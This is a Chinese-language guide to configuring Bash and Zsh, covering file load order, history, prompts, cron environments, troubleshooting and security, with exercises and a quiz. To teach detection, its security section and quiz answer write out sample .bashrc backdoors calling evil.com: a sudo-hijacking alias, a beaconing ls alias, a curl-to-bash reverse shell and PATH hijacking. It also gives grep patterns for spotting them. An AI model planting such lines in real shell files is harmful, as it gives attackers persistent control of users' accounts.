| **提示字元跑版/換行錯亂** ★★★ | 顏色碼沒用 `\[ \]` 包住 | **`\[\e[1;31m\]` 而不是 `\e[1;31m`** |
| **Zsh 啟動很慢** ★★★ | oh-my-zsh 外掛太多 | `zsh -xv` 分析；減少外掛 |
| **中文亂碼** ★★ | locale | `locale-gen zh_TW.UTF-8`；`LANG` |
| **`bind` 報錯** ★★ | 非互動式 | 加 `2>/dev/null`；或判斷 `[[ $- == *i* ]]` |
| **PATH 重複累積** ★★ | 每次 source 都加 | **用 `pathadd` 函式判斷** |
| **`history -d` 後還在** ★★★ | 沒寫回檔案 | **`history -w`** |

### 排查

```bash
# 【1】★★★★ 判斷 shell 類型
$ shopt -q login_shell && echo login || echo non-login
$ [[ $- == *i* ]] && echo interactive || echo non-interactive
$ echo "$0"; echo "$-"

# 【2】★★★ 追蹤載入了哪些檔案
$ bash -lxc 'true' 2>&1 | head -40
$ PS4='+ ${BASH_SOURCE[0]}:${LINENO}: ' bash -lxc 'true' 2>&1 | \
    grep -oP '^\+ \K[^:]+' | sort -u

# 【3】★★★ 語法檢查
$ bash -n ~/.bashrc && echo "★ 語法正確"
$ zsh -n ~/.zshrc

# 【4】★★★ 啟動時間
$ time bash -lic 'exit'
$ time zsh -lic 'exit'
#   ★★ 超過 300ms 就要檢查

# ★★★ zsh 的詳細分析
$ zsh -xv -lic 'exit' 2>&1 | ts -i '%.s' 2>/dev/null | sort -rn | head -20
#   ★ 或用 zprof
$ echo 'zmodload zsh/zprof' | cat - ~/.zshrc > /tmp/z && zsh -c 'source /tmp/z; zprof' | head -20

# 【5】★★ 目前的設定
$ shopt | grep -E 'histappend|globstar|checkwinsize'
$ set -o | grep -E 'history|notify'
$ alias | head -20
$ declare -F | head                 # ★★ 定義了哪些函式
$ bind -p | grep -E '\\e\[A'        # ★ 按鍵綁定

# 【6】★★★★ cron 環境比對
$ (crontab -l 2>/dev/null; echo "* * * * * env > /tmp/cron-env.txt") | crontab -
#   ★ 等一分鐘
$ diff <(env | sort) <(sort /tmp/cron-env.txt) | head -20
$ grep PATH /tmp/cron-env.txt

# 【7】★★ PATH 檢查
$ echo "$PATH" | tr ':' '\n' | nl
$ echo "$PATH" | tr ':' '\n' | sort | uniq -d      # ★★ 重複的
```

---

## 安全性注意事項

> [!danger] 五個要點 ★★★
> ```
> ① ★★★★ 歷史檔含敏感資料
>      → 密碼、token、資料庫連線字串
>      → ★★★ chmod 600 ~/.bash_history
>      → ★★ HISTCONTROL=ignorespace + 指令前加空格
>      → ★★★★ 定期檢查並清理
>
> ② ★★★★ alias 可以被用來隱藏惡意行為
>      → alias sudo='sudo curl evil.sh|sh;sudo'
>      → alias ls='ls; curl -s evil.com/x|sh'
>      → ★★★ 被入侵時攻擊者常改 .bashrc
>      → ★★ 定期檢查；用檔案完整性監控（AIDE / Wazuh FIM）
>
> ③ ★★★ 不要執行來路不明的安裝腳本
>      → curl ... | sh  ← ★★★★ 危險
>      → ★★★ 先下載、看過、再執行
>
> ④ ★★★ PATH 中不要有相對路徑或可寫的目錄
>      → PATH 含 . 或 ~/tmp → ★★★★ 攻擊者放假的 ls 就能提權
>
> ⑤ ★★ 共用帳號的 .bashrc 是共用的攻擊面
>      → ★★★ 每人一個帳號，不要共用 deploy
> ```

```bash
# ★★★★ 歷史檔的保護
$ chmod 600 ~/.bash_history ~/.zsh_history 2>/dev/null
$ ls -l ~/.bash_history
-rw------- 1 admin admin 48210 Aug 28 18:00 /home/admin/.bash_history

# ★★★ 檢查歷史中的敏感資料
$ grep -inE 'password|passwd|-p[A-Za-z0-9]{3,}|token=|secret=|api[_-]?key=|BEGIN.*PRIVATE' \
    ~/.bash_history | head
#   ★★★★ 找到的話：
#     ① history -d <行號> 刪掉
#     ② history -w 寫回
#     ③ ★★★★ 立刻更換那些憑證（★ 已經外洩了）

# ★★★★ 檢查 .bashrc 有沒有被動手腳
$ grep -nE 'curl|wget|nc |bash -i|/dev/tcp|base64 -d|eval' ~/.bashrc ~/.bash_profile ~/.profile
$ diff <(sudo -u deploy cat /home/deploy/.bashrc) /etc/skel/.bashrc

# ★★★ 檔案完整性監控
$ sudo apt install -y aide
$ sudo tee -a /etc/aide/aide.conf.d/99_shell <<'EOF'
/home/[^/]+/\.bashrc$ FIPSR
/home/[^/]+/\.bash_profile$ FIPSR
/home/[^/]+/\.profile$ FIPSR
/etc/profile$ FIPSR
/etc/bash.bashrc$ FIPSR
EOF
$ sudo aideinit && sudo aide --check

# ★★★★ 檢查 PATH
$ echo "$PATH" | tr ':' '\n' | while read -r p; do
    [ -z "$p" ] && { echo "★★★★ 空的路徑元素（等同於 .）"; continue; }
    [ "$p" = "." ] && { echo "★★★★ 危險: 目前目錄在 PATH 中"; continue; }
    [ -w "$p" ] && [ "$(stat -c '%U' "$p" 2>/dev/null)" != "root" ] && \
      echo "★★★ 可寫的路徑: $p"
  done

# ★★★ 檢查可疑的 alias 與函式
$ alias | grep -E 'curl|wget|nc |bash|eval|base64'
$ declare -f | grep -E 'curl|wget|/dev/tcp|eval'

# ★★ 記錄所有指令（★ 稽核需求）
$ sudo apt install -y auditd
$ sudo tee /etc/audit/rules.d/99-exec.rules <<'EOF'
-a exit,always -F arch=b64 -S execve -F euid=0 -k root-commands
EOF
$ sudo augenrules --load
$ sudo ausearch -k root-commands -ts today | head

# ★★★ 或用 shell 的稽核（★ 送到 syslog）
$ cat >> /etc/bash.bashrc <<'EOF'
# ★★ 把每個指令送到 syslog（★ 無法被使用者關閉的做法要用 auditd）
export PROMPT_COMMAND='history -a; logger -p local6.info -t bash -- "$(whoami)[$$]: $(history 1 | sed "s/^ *[0-9]* *//")"'
EOF
```

---

## 速查表

### ★★★★ 設定檔載入順序

```
login shell (SSH/su -)：
  /etc/profile → /etc/profile.d/* →
  ★★★★ ~/.bash_profile → ~/.bash_login → ~/.profile（只執行第一個！）

interactive non-login（新分頁/tmux）：
  /etc/bash.bashrc → ★★★★ ~/.bashrc

non-interactive（腳本/cron/ssh host 'cmd'）：
  ★★★★ 什麼都不讀！

★★★★ 標準做法：~/.bash_profile 加 [ -f ~/.bashrc ] && . ~/.bashrc
```

### ★★★★ 歷史設定

```bash
export HISTSIZE=50000 HISTFILESIZE=100000
export HISTCONTROL=ignoreboth:erasedups   # ★★★ ignorespace = 空格開頭不記錄
export HISTTIMEFORMAT='%F %T  '           # ★★★★ 稽核必備
shopt -s histappend                       # ★★★★ 沒開會遺失！
export PROMPT_COMMAND="history -a; history -c; history -r"
```

### 歷史操作

```bash
C-r          ★★★★ 反向搜尋
!!           上一個指令      sudo !!    ★★★★ 用 sudo 重跑
!$           ★★★ 上一個的最後參數
^old^new     ★★★ 取代重跑
history -d N && history -w    # ★★★ 刪除（★ 一定要 -w）
shopt -s histverify           # ★★ 展開後先顯示
```

### ★★★ 必備的 shopt / bind

```bash
shopt -s histappend cmdhist histverify checkwinsize globstar extglob autocd
stty -ixon                                  # ★★★ C-s 不卡住
bind 'set completion-ignore-case on'
bind '"\e[A": history-search-backward'      # ★★★ 前綴搜尋歷史
```

### ★★★★ 安全 alias

```bash
alias rm='rm -I --preserve-root'   # ★★★ -I 比 -i 好（不養成加 -f 的習慣）
alias cp='cp -i'
alias mv='mv -i'
alias sudo='sudo '                 # ★★ 結尾空格 → sudo 後的 alias 也展開
```

### ★★★ 提示字元依環境變色

```bash
case "$(hostname -s)" in
  *prod*) _HC='\[\e[1;41;97m\]'; _HT=' PROD ' ;;   # ★★★★ 紅底
  *dev*)  _HC='\[\e[1;42;30m\]'; _HT=' DEV ' ;;
esac
[ "$(id -u)" -eq 0 ] && _HC='\[\e[1;41;97m\]'
★★★ 顏色碼一定要用 \[ \] 包住（否則換行會跑版）
```

### ★★★ 排查

```bash
shopt -q login_shell && echo login       # ★★★ 判斷類型
bash -lxc 'true' 2>&1 | head -40         # ★★★ 追蹤載入
bash -n ~/.bashrc                        # ★★★ 語法檢查
time bash -lic 'exit'                    # ★★ 啟動時間
diff <(env|sort) <(sort /tmp/cron-env)   # ★★★★ cron 環境比對
```

### ★★★ 安全

```bash
chmod 600 ~/.bash_history
grep -inE 'password|token|secret' ~/.bash_history    # ★★★★ 定期檢查
grep -nE 'curl|wget|/dev/tcp|eval' ~/.bashrc         # ★★★ 檢查後門
echo "$PATH" | tr ':' '\n'                            # ★★★ 不要有 . 或可寫目錄
★★★ 伺服器用調校過的 bash，不要裝 oh-my-zsh
```

---

## 練習題

> [!question]- 練習 1：載入順序 ★★★★
> 1. **在 `~/.bashrc` 和 `~/.bash_profile` 各加一行 `echo`**
> 2. **SSH 登入** → 看到哪些？
> 3. **在圖形終端機開新分頁** → 呢？
> 4. **`ssh localhost 'echo test'`** → 呢？
> 5. **`bash -lxc 'true' 2>&1 | head -40`** 追蹤
> 6. **為什麼 `.bash_profile` 要加 `. ~/.bashrc`？**

> [!question]- 練習 2：歷史 ★★★★
> 1. **開三個終端機，各執行不同的指令**
> 2. **全部關閉後 `wc -l ~/.bash_history`** → 都在嗎？
> 3. **加上 `histappend` 和 `PROMPT_COMMAND` 再測一次**
> 4. **設 `HISTTIMEFORMAT` 後 `history | tail`** → 有時間了嗎？
> 5. **用 `HISTCONTROL=ignorespace`，執行一個前面有空格的指令** → 有記錄嗎？
> 6. **`grep -inE 'password' ~/.bash_history`** → 有嗎？怎麼處理？

> [!question]- 練習 3：cron 環境 ★★★★
> 1. **`* * * * * env > /tmp/cron-env.txt`**
> 2. 等一分鐘，**`diff <(env|sort) <(sort /tmp/cron-env.txt)`**
> 3. **`PATH` 差多少？**
> 4. **寫一個用到 alias 的腳本放進 cron** → 成功嗎？
> 5. **改成絕對路徑再試**
> 6. **列出三個讓 cron 腳本可靠的做法**

> [!question]- 練習 4：提示字元 ★★★
> 1. **設定依主機名變色的 PS1**
> 2. **`sudo -i` 切到 root** → 顏色變了嗎？
> 3. **故意把顏色碼的 `\[ \]` 拿掉，然後打一行很長的指令** → 跑版嗎？
> 4. 加上 git 分支顯示
> 5. **加上「上一個指令失敗時顯示錯誤碼」**
> 6. **`time bash -lic 'exit'`** → PS1 的函式讓啟動變慢了嗎？

> [!question]- 練習 5：安全 ★★★★
> 1. **在 `.bashrc` 加 `alias ls='ls; echo pwned'`**（模擬後門）
> 2. **`alias | grep -E 'curl|echo'`** → 找得到嗎？
> 3. **`grep -nE 'curl|wget|eval' ~/.bashrc`**
> 4. **檢查 `PATH` 有沒有可寫的目錄或 `.`**
> 5. **`chmod 600 ~/.bash_history` 並檢查敏感資料**
> 6. **設定 AIDE 監控 `.bashrc` 的變更**

---

## 小測驗

Q1. **SSH 登入時會讀哪些設定檔**？和開新分頁有什麼不同？

Q2. **為什麼 `.bash_profile` 要加 `. ~/.bashrc`**？

Q3. **cron 的腳本找不到指令，為什麼**？三個解法？

Q4. **`shopt -s histappend` 不設會發生什麼**？

Q5. **`HISTCONTROL=ignorespace` 有什麼用**？怎麼用？

Q6. **`alias rm='rm -i'` 有什麼隱藏的風險**？建議怎麼設？

Q7. **PS1 中的顏色碼為什麼要用 `\[ \]` 包住**？

Q8. **`alias sudo='sudo '`（結尾有空格）做什麼**？

Q9. **為什麼建議伺服器上不要裝 oh-my-zsh**？

Q10. **`.bashrc` 為什麼是入侵者常改的檔案**？怎麼偵測？

> [!question]- 測驗答案
> **Q1.** **SSH 登入是 login shell**，讀取順序：
> `/etc/profile` → `/etc/profile.d/*.sh` →
> 然後**依序找 `~/.bash_profile` → `~/.bash_login` → `~/.profile`，
> ★★★★ 只執行第一個找到的**。
> **在圖形終端機開新分頁、tmux 開新 window 是 interactive non-login shell**，
> 讀的是 `/etc/bash.bashrc` → **`~/.bashrc`**。
> **★★★★ 兩者讀的是完全不同的檔案** ——
> 這就是「我改了 `.bashrc`，開新分頁有效，但 SSH 進來沒效」的原因。
> **第三種是 non-interactive**（腳本、`ssh host 'cmd'`、cron）——
> **什麼設定檔都不讀**（除非設了 `BASH_ENV`）。
> 判斷方式：`shopt -q login_shell`、`[[ $- == *i* ]]`、`echo $0`（開頭有 `-` 是 login）。
>
> **Q2.** 因為 **login shell 不會讀 `~/.bashrc`** ——
> 它只讀 `~/.bash_profile`（或 `.bash_login`/`.profile`）。
> 如果你把所有設定（alias、函式、PS1、歷史設定）都放在 `.bashrc`，
> **SSH 登入時全部都不會生效**。
> **標準做法**：
> ```bash
> # ~/.bash_profile
> if [ -f ~/.bashrc ]; then
>     . ~/.bashrc
> fi
> ```
> 這樣就統一了 —— **所有互動式設定放 `.bashrc`，
> `.bash_profile` 只負責把它載進來**（再加上只需要執行一次的東西，
> 例如 `ssh-agent` 啟動）。
> Ubuntu 的 `~/.profile` 和 RHEL 的 `~/.bash_profile` 預設已經有這段，
> 但自己建立新使用者或用非標準的 skel 時要記得檢查。
>
> **Q3.** 因為 **cron 是 non-interactive、non-login shell，不讀任何設定檔** ——
> 不讀 `/etc/profile`、不讀 `~/.bashrc`、不讀 `~/.profile`。
> **`PATH` 只有極精簡的 `/usr/bin:/bin`**，
> 而且沒有你的 alias、沒有你 export 的環境變數
> （`JAVA_HOME`、`NVM_DIR`、`COMPOSER_HOME` 全部沒有）。
> **三個解法**：
> ①**★★★★ 腳本中一律用絕對路徑**：
> `/usr/bin/php /var/www/app/artisan schedule:run`；
> ②**★★★ 腳本開頭明確設定環境**：
> ```bash
> export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
> [ -f /etc/profile ] && . /etc/profile
> ```
> ③**★★ crontab 頂端設定**：`PATH=...` 和 `SHELL=/bin/bash`。
> **除錯技巧**：`* * * * * env > /tmp/cron-env.txt`
> 然後 `diff <(env|sort) <(sort /tmp/cron-env.txt)`。
>
> **Q4.** **★★★★ 歷史紀錄會遺失**。
> 沒有 `histappend` 時，shell 離開會用**記憶體中的歷史「覆蓋」整個檔案**。
> **災難情境**：你開了三個終端機 ——
> A 執行 100 個指令、B 執行 50 個。
> **B 先關閉** → 檔案變成 B 的 50 個；
> **A 後關閉** → 檔案變成 A 的 100 個 → **B 的 50 個完全消失**。
> **正確設定**：
> ```bash
> shopt -s histappend
> export PROMPT_COMMAND="history -a; history -c; history -r; ${PROMPT_COMMAND:-}"
> ```
> `history -a` 每個指令後**立刻附加寫入檔案**，
> `history -c; history -r` 清空記憶體並重讀 ——
> 這樣**三個終端機的歷史都完整保留，而且可以互相看到對方剛執行的指令**。
> Zsh 的對應是 `setopt APPEND_HISTORY SHARE_HISTORY INC_APPEND_HISTORY`。
>
> **Q5.** **★★★ `ignorespace` 讓「開頭有空格的指令」不被記錄到歷史**。
> **用法：在指令前面多打一個空格**：
> ```bash
> export HISTCONTROL=ignorespace       # 或 ignoreboth（含 ignoredups）
> $  mysql -u root -pSecret123         # ★★★ 前面有空格 → 不進歷史
> $ history | tail -3                  # ★ 確認沒有
> ```
> **用途**：執行**含密碼、token 的一次性指令**時避免留下紀錄。
> **但這只是最後一道防線** ——
> **更好的做法是根本不要在指令列放密碼**：
> `mysql -u root -p`（互動輸入）、
> `curl --netrc-file ~/.netrc`、
> `read -rs -p "密碼: " PW`。
> 因為即使不進歷史，**指令列仍然會出現在 `ps aux` 和 `/proc/PID/cmdline`**，
> 同機器的其他使用者看得到。
>
> **Q6.** **★★★★ 風險是「養成壞習慣」**。
> 你習慣了「`rm` 會問我」，於是刪東西時不再仔細確認 ——
> 但到了**一台沒有這個 alias 的機器**（別人的伺服器、root shell、
> 容器內、或**腳本中**，因為腳本不展開 alias），
> **`rm -rf` 就直接執行，沒有任何確認**。
> 更糟的是很多人被 `-i` 問煩了，開始反射性地加 `-f` 繞過，
> **反而比沒有 alias 更危險**。
> **建議用 `-I` 而不是 `-i`**：
> ```bash
> alias rm='rm -I --preserve-root'
> ```
> **`-I` 只在「刪 3 個以上檔案或遞迴刪目錄」時問一次** ——
> 日常刪單一檔案不會煩你，所以不會養成加 `-f` 的習慣，
> 而真正危險的批次刪除會被攔下來。
> **`--preserve-root` 防止 `rm -rf /`**。
>
> **Q7.** 因為 **bash 需要知道哪些字元「不佔螢幕寬度」才能正確計算游標位置**。
> 顏色碼（如 `\e[1;31m`）是**跳脫序列，不會顯示出來**，
> 但如果沒有用 `\[ \]` 標記，bash 會把它們**算進提示字元的長度**。
> **後果**：
> 打一行超過螢幕寬度的指令時，**換行位置計算錯誤** ——
> 游標跑到錯的地方、文字覆蓋提示字元、按 `Ctrl+R` 搜尋歷史時畫面錯亂、
> 用方向鍵編輯長指令時完全亂掉。
> **正確寫法**：
> ```bash
> PS1='\[\e[1;31m\]\u@\h\[\e[0m\] \w\$ '
> #    ↑↑        ↑↑
> #    包住不可見的部分
> ```
> **在 PS1 呼叫的函式中**（例如 git 分支）要用 `\001` 和 `\002`
> （`\[` 和 `\]` 的原始位元組）。
>
> **Q8.** **★★★ 讓 `sudo` 後面的指令也能展開 alias**。
> **預設情況下 `sudo ll` 會失敗** ——
> bash 只會展開「指令列第一個單字」的 alias，
> `sudo` 之後的 `ll` 被當成一般指令，而 `/usr/bin/ll` 不存在。
> **bash 的規則是：如果一個 alias 的值以空白結尾，
> 那麼它後面的下一個單字也會被檢查是否為 alias**。
> ```bash
> alias sudo='sudo '        # ★★ 注意結尾的空格
> alias ll='ls -alFh'
> $ sudo ll /root           # ★★★ 現在可以了
> ```
> **注意**：這只解決 alias 的問題，
> **函式仍然不能透過 sudo 使用**（sudo 執行的是新的程序，
> 不會繼承 shell 函式）——
> 要用 `sudo bash -c 'function...'` 或把函式寫成獨立的腳本。
>
> **Q9.** **五個理由**：
> ①**★★★ 多一個套件 = 多一個攻擊面與更新負擔**；
> ②**★★★★ oh-my-zsh 是「從 GitHub 下載並執行的大量腳本」** ——
> 安裝方式本身就是 `curl ... | sh`（供應鏈風險），
> 而且曾有第三方外掛被植入惡意程式碼的案例；
> ③**★★★ 啟動變慢**（oh-my-zsh 可能多 200~500ms）——
> SSH 進去只想跑一個指令卻要等；
> ④**★★★★ 救援模式、新裝的機器、容器內只有 bash** ——
> 太依賴 zsh 的補全與別名的人，**在最需要的時候反而不會用**；
> ⑤**★★ 團隊環境不一致**，交接時對方看不懂你的設定。
> **折衷做法**：伺服器用**調校過的 bash**（歷史、補全、PS1 就很夠用），
> 把 alias 和函式抽成 `~/.shell_aliases` 讓兩邊共用，
> 用 **Ansible 統一派送**而不是每台手動裝。
>
> **Q10.** 因為 **`.bashrc` 是「每次開 shell 都會執行的程式碼」，
> 而且是使用者自己可寫的** ——
> 對攻擊者來說這是**理想的持久化（persistence）位置**：
> ```bash
> alias sudo='sudo curl -s evil.com/x.sh|sh; sudo'   # ★★★★ 攔截 sudo
> alias ls='ls; curl -s evil.com/beacon'             # 每次 ls 都回報
> (curl -s evil.com/rev.sh | bash &) 2>/dev/null     # 反向 shell
> export PATH="$HOME/.local/bin:$PATH"               # ★★★ 劫持 PATH
> ```
> 不需要 root 權限、重開機後依然有效、而且很少有人會去看。
> **偵測方式**：
> ①**★★★ 定期檢查**：
> ```bash
> grep -nE 'curl|wget|nc |bash -i|/dev/tcp|base64 -d|eval' ~/.bashrc ~/.profile
> alias | grep -E 'curl|wget|eval|base64'
> declare -f | grep -E 'curl|/dev/tcp'
> ```
> ②**★★★★ 檔案完整性監控**（AIDE / Wazuh FIM / Tripwire）——
> 監控 `/home/*/.bashrc`、`/etc/profile`、`/etc/bash.bashrc` 的變更並告警；
> ③**★★ 與 `/etc/skel` 比對**；
> ④**★★★ 檢查 `PATH` 中有沒有可寫的目錄或 `.`**。

---

## 延伸閱讀

- [[020-01-03-cmd-Linux-終端機與Shell入門]] — shell 基礎
- [[020-01-20-guide-Linux-環境變數與設定檔]] — 環境變數的完整說明
- [[020-01-21-cmd-Linux-Shell腳本入門]] — 寫腳本
- [[060-01-05-04-guide-終端機-現代CLI工具集]] — fzf / ripgrep / bat 等
- [[060-01-05-01-guide-tmux-工作階段管理]] — 搭配 tmux
- [[020-01-18-guide-Linux-排程工作]] — cron 的環境問題
